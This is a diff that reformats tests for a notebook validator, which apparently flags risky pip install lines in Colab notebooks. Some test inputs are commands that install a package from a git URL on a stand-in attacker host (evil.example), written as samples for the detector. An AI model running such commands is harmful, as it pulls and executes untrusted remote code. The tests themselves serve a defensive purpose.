@@ -2803,11 +2803,13 @@ def test_env_split_string_keeps_the_arguments_that_follow_it():
             "R-INST-001"
         ], cell
     # The whole command inside the split string still works, and so does no split string.
-    assert [f.rule for f in nv.rule_inst_001_git_plus(
-        '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0)] == ["R-INST-001"]
-    assert nv._strip_exec_prefixes(
-        "env -u PIP_INDEX_URL pip install x"
-    ) == ("pip install x", True)
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    assert nv._strip_exec_prefixes("env -u PIP_INDEX_URL pip install x") == ("pip install x", True)
 
 
 def test_interpreter_options_may_precede_the_module_flag():
@@ -2846,10 +2848,13 @@ def test_an_uninstall_removes_the_package_from_the_resolved_set():
     assert resolved.get("torchao") is None
     assert resolved.get("peft") == "0.19"
     # A reinstall after the uninstall wins, and inherits no bound from before it.
-    assert nv.resolved_set(
-        "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao==0.17",
-        colab,
-    ).get("torchao") == "0.17"
+    assert (
+        nv.resolved_set(
+            "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao==0.17",
+            colab,
+        ).get("torchao")
+        == "0.17"
+    )
 
 
 def test_a_bounded_window_on_an_absent_package_lands_on_its_newest_release():
@@ -2884,12 +2889,18 @@ def test_builtin_is_not_an_exec_prefix():
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
 
-    assert nv.rule_inst_004_torchcodec_torch(
-        '!builtin pip install "torch==2.12.0"', colab, "nb.ipynb", 0
-    ) == []
-    assert nv.rule_inst_001_git_plus(
-        "!builtin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!builtin pip install "torch==2.12.0"', colab, "nb.ipynb", 0
+        )
+        == []
+    )
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!builtin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+        == []
+    )
     # The prefixes that really do run the command after them are untouched.
     for prefix in ("command", "exec", "nohup", "time", "sudo"):
         assert nv._strip_exec_prefixes(f"{prefix} pip install x") == ("pip install x", True), prefix
